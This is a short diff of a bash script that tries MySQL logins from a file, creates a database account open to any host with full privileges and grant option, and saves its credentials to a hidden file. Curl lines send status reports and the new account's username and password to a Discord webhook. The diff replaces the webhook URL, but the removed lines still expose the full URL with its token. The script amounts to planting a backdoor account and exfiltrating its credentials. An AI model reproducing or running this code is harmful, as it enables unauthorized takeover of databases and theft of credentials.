@@ -32,7 +32,7 @@ do
     ((i++))
     if [[ $i -gt $total_line_file ]]
     then
-        curl -H "Content-Type: application/json" -d '{"username": "WARNING", "content": "Aucun Username et Password dans le fichier et le root fonctionne, réussite de leur côté, MYSQL protégé."}' "https://discord.com/api/webhooks/1042025868870041611/g6X0JMVn9SfUkT3NWX_bhJvXRR7XDF-0n0l4jbLPhZ74jFX-KMrcGMno8o9jxqFM8v7J"
+        curl -H "Content-Type: application/json" -d '{"username": "WARNING", "content": "Aucun Username et Password dans le fichier et le root fonctionne, réussite de leur côté, MYSQL protégé."}' "URL"
         exit
     else
        value=$(check_db $mysql_user $mysql_mdp >> /dev/null)
@@ -43,6 +43,6 @@ done
 mysql -u${mysql_user} -p${mysql_mdp} -e "CREATE USER '$username'@'%' IDENTIFIED BY '$password';"
 mysql -u${mysql_user} -p${mysql_mdp}  -e "GRANT ALL PRIVILEGES ON *.* TO '$username'@'%' WITH GRANT OPTION;"
 
-curl -H "Content-Type: application/json" -d '{"username": "Compte MySQL '"${username}"'", "content": "username = '"${username}"' \npassword = '"${password}"'"}' "https://discord.com/api/webhooks/1042025868870041611/g6X0JMVn9SfUkT3NWX_bhJvXRR7XDF-0n0l4jbLPhZ74jFX-KMrcGMno8o9jxqFM8v7J"
+curl -H "Content-Type: application/json" -d '{"username": "Compte MySQL '"${username}"'", "content": "username = '"${username}"' \npassword = '"${password}"'"}' "URL"
 
 echo "$username $password" >> /opt/.credentialsmysql
